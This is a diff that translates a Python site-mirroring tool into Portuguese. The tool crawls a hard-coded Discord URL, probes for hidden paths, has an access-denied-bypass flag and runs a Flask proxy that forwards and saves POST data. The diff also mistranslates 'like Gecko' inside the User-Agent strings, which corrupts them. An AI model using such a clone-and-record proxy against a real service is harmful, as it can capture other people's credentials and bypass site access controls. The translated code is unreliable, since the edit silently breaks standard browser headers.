@@ -11,28 +11,28 @@ from urllib.parse import urljoin, urlparse
 import sys
 import platform
 
-# Enable Windows fixes (long paths, invalid names)
+# Ativa correções para Windows (caminhos longos, nomes inválidos)
 try:
-    import lib_windows_eng
-    lib_windows.ENABLE_WIN_LIB()
+    import lib_windows_ptbr
+    lib_windows_ptbr.ENABLE_WIN_LIB()
 except Exception as e:
-    print(f"[WARN] lib_windows could not be enabled: {e}")
+    print(f"[AVISO] lib_windows não pôde ser ativado: {e}")
 
 sys.setrecursionlimit(10000)
 
-# -------------------- CONFIGURATION --------------------
+# -------------------- CONFIGURAÇÃO --------------------
 MODE = "AUTO_MODE"
 SITE_URL = "https://discord.com"
-PORT = 80
-FORCE_ACCESS_DENIED_BYPASS = True
-SCAN_FOR_HIDDEN_PATHS = True
-ENABLE_HIDDEN_ELEMENTS = True
-SHOW_HIDDEN_ELEMENTS = True
-ENABLE_CRAWLING = True
+PORT = 8080
+FORCE_ACCESS_DENIED_BYPASS = False
+SCAN_FOR_HIDDEN_PATHS = False
+ENABLE_HIDDEN_ELEMENTS = False
+SHOW_HIDDEN_ELEMENTS = False
+ENABLE_CRAWLING = False
 HEADER_DEVICE = "desktop"
-ACCEPT_ALL_MIRRORS_REQUEST = True
+ACCEPT_ALL_MIRRORS_REQUEST = False
 
-# -------------------- DEVICE DETECTION --------------------
+# -------------------- DETECÇÃO DE DISPOSITIVO --------------------
 def detect_device():
     if HEADER_DEVICE != "auto":
         return HEADER_DEVICE.lower()
@@ -48,12 +48,12 @@ def detect_device():
 def get_headers_for_device(device):
     if device == "mobile":
         return {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Mobile Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/126.0.6478.127 Mobile Safari/537.36",
             "Accept-Encoding": "br, gzip"
         }
     elif device == "tablet":
         return {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Tablet) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/126.0.6478.127 Safari/537.36",
             "Accept-Encoding": "br, gzip"
         }
     elif device == "bot":
@@ -63,11 +63,11 @@ def get_headers_for_device(device):
         }
     else:
         return {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/126.0.6478.127 Safari/537.36",
             "Accept-Encoding": "br, gzip"
         }
 
-# -------------------- PATHS --------------------
+# -------------------- CAMINHOS --------------------
 device_type = HEADER_DEVICE if HEADER_DEVICE != "auto" else "desktop"
 SITE_NAME = urlparse(SITE_URL).netloc.replace("www.", "").replace(".", "_")
 SITE_SRC = os.path.join("site_src", f"{SITE_NAME}_{device_type}")
@@ -80,13 +80,13 @@ MAX_VISITED = 1000
 
 app = Flask(__name__, static_folder=None)
 
-# -------------------- HELPERS --------------------
+# -------------------- FUNÇÕES AUXILIARES --------------------
 def is_valid_url(url):
     p = urlparse(url)
     return bool(p.netloc) and bool(p.scheme)
 
 def local_path(url):
-    from lib_windows import safe_path
+    from lib_windows_ptbr import safe_path
     p = urlparse(url)
     path = p.path
     if path.endswith("/"): path += "index.html"
@@ -130,15 +130,15 @@ def check_and_download_mirror(url):
     global ACCEPT_ALL_MIRRORS_REQUEST
     if ACCEPT_ALL_MIRRORS_REQUEST:
         return crawl(url)
-    print(f"\n[Mirror detected] {url}")
-    choice = input("Download mirror? (Y)es / (N)o / (A)ccept all: ").strip().upper()
-    if choice == "Y":
+    print(f"\n[Mirror detectado] {url}")
+    choice = input("Baixar mirror? (S)im / (N)ão / (A)ceitar todos: ").strip().upper()
+    if choice == "S":
         return crawl(url)
     elif choice == "A":
         ACCEPT_ALL_MIRRORS_REQUEST = True
         return crawl(url)
 
-# -------------------- DOWNLOAD AND CRAWLING --------------------
+# -------------------- DOWNLOAD E CRAWLING --------------------
 def download(url):
     if already_downloaded(url):
         print(f"[CACHE] {url}")
@@ -150,7 +150,7 @@ def download(url):
         r.raise_for_status()
         return save_content(url, try_decompress(r))
     except Exception as e:
-        print(f"[ERROR] {url}: {e}")
+        print(f"[ERRO] {url}: {e}")
         return None
 
 def is_html(content):
@@ -159,7 +159,7 @@ def is_html(content):
 def crawl(url):
     global visited
     if len(visited) >= MAX_VISITED:
-        print("[WARNING] Maximum visited URLs limit reached")
+        print("[AVISO] Limite máximo de URLs visitadas atingido")
         return
     if url in visited:
         return
@@ -198,7 +198,7 @@ def crawl(url):
                 hp_url = urljoin(SITE_URL + "/", hp)
                 r = requests.get(hp_url, headers={"Accept-Encoding": "br, gzip"})
                 if r.status_code == 200 and is_html(r.content):
-                    print(f"[HIDDEN] {hp_url}")
+                    print(f"[OCULTO] {hp_url}")
                     crawl(hp_url)
             except:
                 pass
@@ -222,7 +222,7 @@ def proxy(path):
             r = requests.post(target, data=data, headers=request.headers)
             return Response(r.content, status=r.status_code, content_type=r.headers.get("Content-Type"))
         except Exception as e:
-            return Response(f"Error: {e}", status=502)
+            return Response(f"Erro: {e}", status=502)
 
     if os.path.exists(local):
         mime = mimetypes.guess_type(local)[0] or "application/octet-stream"
@@ -238,18 +238,18 @@ def proxy(path):
             f.write(content)
         return Response(content, status=r.status_code, content_type=r.headers.get("Content-Type"))
     except Exception as e:
-        return Response(f"Remote error: {e}", status=500)
+        return Response(f"Erro remoto: {e}", status=500)
 
-# -------------------- MAIN --------------------
+# -------------------- PRINCIPAL --------------------
 if __name__ == '__main__':
     os.makedirs(SITE_SRC, exist_ok=True)
     os.makedirs(SITE_DATA, exist_ok=True)
     if ENABLE_CRAWLING:
-        print(f"Starting crawl of site: {SITE_URL} (mode: {MODE})")
+        print(f"Iniciando crawling do site: {SITE_URL} (modo: {MODE})")
         crawl(SITE_URL)
     else:
-        print("Crawling disabled.")
-    print(f"Files saved in: {os.path.abspath(SITE_SRC)}")
-    print(f"POSTs saved in: {os.path.abspath(SITE_DATA)}")
-    print(f"Server running at: http://127.0.0.1:{PORT}")
+        print("Crawling desativado.")
+    print(f"Arquivos salvos em: {os.path.abspath(SITE_SRC)}")
+    print(f"POSTs salvos em: {os.path.abspath(SITE_DATA)}")
+    print(f"Servidor rodando em: http://127.0.0.1:{PORT}")
     app.run(host="0.0.0.0", port=PORT)
